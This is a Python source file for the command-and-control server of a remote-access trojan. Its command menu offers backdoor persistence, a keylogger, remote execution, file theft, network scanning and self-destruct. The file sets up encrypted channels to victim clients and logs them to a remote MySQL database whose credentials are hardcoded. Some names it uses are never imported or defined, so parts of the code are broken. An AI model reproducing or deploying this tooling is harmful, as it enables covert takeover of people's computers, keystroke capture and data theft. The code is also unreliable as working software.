#!/usr/bin/env python

import os, sys, socket, threading, argparse, time, json, mysql.connector, termios, tty
from requests import post
from base64 import b64encode, b64decode
from binascii import hexlify, unhexlify
from Crypto.Cipher import AES
from Crypto.Hash import SHA256, HMAC
from Crypto.Util.number import bytes_to_long, long_to_bytes

CLIENT_COMMANDS = [ 'backdoor','cat','client','clients','decrypt','download','encrypt','enum','execute','help','info','keylogger','kill','lan','ls','persistence','pwd','quit','register','scan','selfdestruct','update','upload','wget']

HELP_CMDS = ''' 
---------------------------------------------------------------------------
COMMAND               | DESCRIPTION
---------------------------------------------------------------------------
backdoor              | Persistent hidden backdoor [Windows & Mac OS X]
cat <file>            | Display the target file's content
client <id>           | Connect to a client
clients               | List connected clients
download <filepath>   | Downloads a file from FTP server to client
execute <command>     | Execute processes with continuous output
help                  | Show this help menu
info                  | Key information about client host machine
kill                  | Kill the client connection
lan                   | Scan client local area network
ls <path>             | List files in working directory
pwd                   | Current working directory
quit                  | Exit server and keep clients alive
register              | Register a new client in the database
scan <ip>             | Scan top 25 TCP ports on the target IP
selfdestruct          | Remove client from target system
update                | Update client if new version available
upload <filepath>     | Uploads a file from client to server
wget <url>            | Download file from a URL
encrypt/decrypt       | 128-bit AES encryption + HMAC-SHA256 authentication
----------------------------------------------------------------------------'''



class Server(threading.Thread):
    def __init__(self, port):
        super(Server, self).__init__()
        self.auth           = {'username':'helloFBI', 'password':'vega6812'}
        self.username       = '5881a198c709e551df7dd123963a98ea752e72362a56d5302ea606e031acdc64'
        self.password       = '03442b2ec33d7d49e885f9764f9015d4fad562a90daac0f95497d8e27b4b8347'
        self.validate       = sys.exit(0) if [SHA256.new(self.auth.get('username')).hexdigest() == self.username, SHA256.new(self.auth.get('password')).hexdigest() == self.password].count(True) != 2 else True
        self.cond           = threading.Condition()
        self.clients        = dict({})
        self.client_count   = 1
        self.current_client = None
        self.commands       = {'client'         :   self.select_client,
                               'clients'        :   self.list_clients,
                               'goodbye'        :   self.goodbye_server,
                               'help'           :   self.print_help,
                               'kill'           :   self.kill_client,
                               'quit'           :   self.quit_server,
                               'selfdestruct'   :   self.selfdestruct_client,
                               'sendall'        :   self.send_to_all
                              }

        self.s                  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def _pad(self, data):
        return data + b'\0' * (AES.block_size - len(data) % 16)

    def encrypt(self, plaintext, dhkey):
        text        = self._pad(plaintext)
        iv          = os.urandom(AES.block_size)
        cipher      = AES.new(dhkey[:16], AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = HMAC.new(dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
        return b64encode(ciphertext + hmac_sha256)

    def decrypt(self, ciphertext, dhkey):
        ciphertext = b64decode(ciphertext)
        iv         = ciphertext[:AES.block_size]
        cipher     = AES.new(dhkey[:16], AES.MODE_CBC, iv)
        check_hmac = ciphertext[len(ciphertext)-SHA256.digest_size:]
        calc_hmac  = HMAC.new(dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
        output     = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size]).rstrip(b'\0')
        warnings   = "\nWarning: HMAC-SHA256 hash authentication failed\n"
        if check_hmac != calc_hmac:
            print warnings
        return output

    def obfuscate(self, data):
        data    = hexlify(data)
        p       = []
        block   = hex(randrange(15))[2:] + hex(randrange(15))[2:]
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += hex(randrange(15))[2:]
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def deobfuscate(self, block):
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        return unhexlify(str().join(block[n] for n in p))

    def run(self):
	while True:
            conn, addr = self.s.accept()
            client_id = self.client_count
            client = Client(conn, addr, client_id)
            self.clients[client_id] = client
            print '\n\nClient [{}] has connected'.format(str(self.client_count)) + ' from {}\n'.format(client.addr)
            self.client_count += 1
            self.select_client(client_id)

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
        except (KeyError, ValueError):
            print 'Error: Invalid Client ID.'

    def send_to_all(self, command):
        for cid in self.clients.iterkeys():
            try:
                self.select_client(cid)
                self.current_client.sender(command, self.current_client.dhkey)
            except Exception as e:
                print "Error sending command '{}' to client [{}]".format(command, str(id))

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        self.current_client.sender('kill')
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        current_client = None

    def selfdestruct_client(self, _):
        self.current_client.sender('selfdestruct')
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print 'ID | Client Address\n-------------------'
        for k, v in self.clients.items():
            print '{:>2} | {}'.format(k, v.addr[0])

    def quit_server(self, _):
        if raw_input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
            try:
                for c in self.get_clients():
                    try:
                        c.sender('quit')
                    except: pass
                    try:
                        c.shutdown(socket.SHUT_RDWR)
                    except: pass
                    try:
                        c.close()
                    except: pass
            finally:
                self.s.shutdown(socket.SHUT_RDWR)
                self.s.close()
                sys.exit(0)
                sys.exit(0)

    def goodbye_server(self, _):
        if raw_input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
            for c in self.get_clients():
                try:
                    c.sender('selfdestruct')
                except: pass
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def print_help(self, _):
        print HELP_CMDS


class Client(threading.Thread):
    def __init__(self, conn, addr, uid):
        super(Client, self).__init__()
        self.conn       = conn
        self.addr       = addr
        self.uid        = uid
        self.dhkey      = self.diffiehellman()
        self.mac        = bytes()
        self.registered = bool()
        self.q          = Queue.Queue()
        self.current    = lambda:bool(server.current_client.uid == self.uid)
        self.mysql      = lambda:mysql.connector.connect(host="mysql5019.smarterasp.net", user="a1eedc_imgur", password="10FUCKINGchar!", database="db_a1eedc_imgur")

    def diffiehellman(self, bits=2048):
        p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        g = 2
        a = bytes_to_long(os.urandom(32))
        xA = pow(g, a, p)

        self.conn.send(long_to_bytes(xA))
        b = bytes_to_long(self.conn.recv(256))

        s = pow(b, a, p)
        return SHA256.new(long_to_bytes(s)).digest()

    def _pad(self, data):
        return data + b'\0' * (AES.block_size - len(data) % 16)

    def encrypt(self, plaintext):
        text        = self._pad(plaintext)
        iv          = os.urandom(AES.block_size)
        cipher      = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
        return b64encode(ciphertext + hmac_sha256)

    def decrypt(self, data):
        try:
            ciphertext = b64decode(data)
            iv         = ciphertext[:AES.block_size]
            cipher     = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
            check_hmac = ciphertext[-SHA256.digest_size:]
            calc_hmac  = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            output     = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
            warnings   = "\nWarning: HMAC-SHA256 hash authentication failed\n"
            if check_hmac != calc_hmac:
                print warnings
            return output.rstrip(b'\0')
        except ValueError:
            print "Decryption error for data: ",
            print data

    def sender(self, data):
        self.conn.sendall(self.encrypt(data))

    def register(self, info):
        db  = self.mysql()
        cursor  = db.cursor()
        try:
            cursor.execute(info)
            return True
        except Exception as e:
            print "Registration error: {}".format(str(e))
            return False

    def query(self, data):
        db = self.mysql()
        cursor = db.cursor()
        try:
            cursor.execute(data)
        except Exception as xep:
            return 'Query returned error: {}'.format(str(xep))
        if data.startswith('INSERT'):
            return 'Query executed successfully'
        else:
            try:
                return "\n".join([i for i in cursor.fetchall()])
            except:
                return'Query returned no output'

    def run(self):
        global server
        while True:
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += self.conn.recv(4096)
                method, _, data = cmd_buffer.partition(':')
                client_data = self.decrypt(data)
            if 'prompt' in method:
                print client_data.format(self.uid)
                client_buffer += "\n"
                self.sender(client_buffer)
            else:
                if 'register' in method:
                    self.registered = self.register(client_data)
                elif 'mac' in method:
                    self.mac = client_data
                print client_data


def get_parser():
    parser = argparse.ArgumentParser(description='server')
    parser.add_argument('-p', '--port', help='port to listen', default=1337, type=int)
    return parser

if __name__ == '__main__':
    parser = get_parser()
    args   = vars(parser.parse_args())
    port   = args['port']
    client = None
    server  = Server(port)
    print "Listening on port %d for incoming client connections..." % port
    server.start()
